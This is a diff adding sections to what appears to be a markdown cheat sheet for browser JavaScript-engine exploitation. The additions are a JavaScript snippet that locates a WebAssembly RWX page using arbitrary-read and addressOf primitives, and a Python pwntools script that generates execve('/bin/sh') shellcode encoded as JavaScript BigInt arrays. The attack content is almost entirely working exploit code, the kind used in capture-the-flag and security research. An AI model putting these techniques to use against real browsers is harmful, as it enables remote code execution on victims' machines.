@@ -191,3 +191,61 @@ function get_shell()
 }
 get_shell();
 ```
+# Wasm Instance
+```javascript
+var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+var f= wasmInstance.exports.main;
+
+var sh_addr = aar(aar(addressOf(wasmCode)+0x10n)-1n+0x18n);
+var owx = aar(sh_addr);
+```
+# Wasm shellcode genrator
+```python
+import copy
+from pwn import *
+context.arch='amd64'
+sh='''
+xor rax,rax
+mov al,59
+xor rsi,rsi
+xor rdx,rdx
+{}
+mov rdi,rsp
+syscall
+'''
+def convert2js(s):
+	res=[]
+	s= s.ljust((len(s)//8+1)*8,'\0')
+	for x in range(len(s)//8):
+		res.append(u64(s[x*8:x*8+8]))
+	return res
+def command(s):
+	res=[]
+	if(len(s)%8!=0):
+		s= s.ljust((len(s)//8+1)*8,'\0')
+	for x in range(len(s)//8):
+		res.append(u64(s[x*8:x*8+8]))
+	return res
+def run():
+	tmp = command("/bin/sh")
+	s ="""
+mov rdi,{}
+push rdi
+	"""
+	res=''
+	l= len(tmp)
+	for x in range(l):
+		xx = s.format(hex(tmp[l-1-x]))
+		res+=sh.format(xx)
+	#print(res)
+	t=asm(res)
+	a=convert2js(t)
+	final = "var shell = ["
+	for x in a:
+		final +=" {}n,".format(hex(x))
+	return final+"];"
+	
+print run()
+```
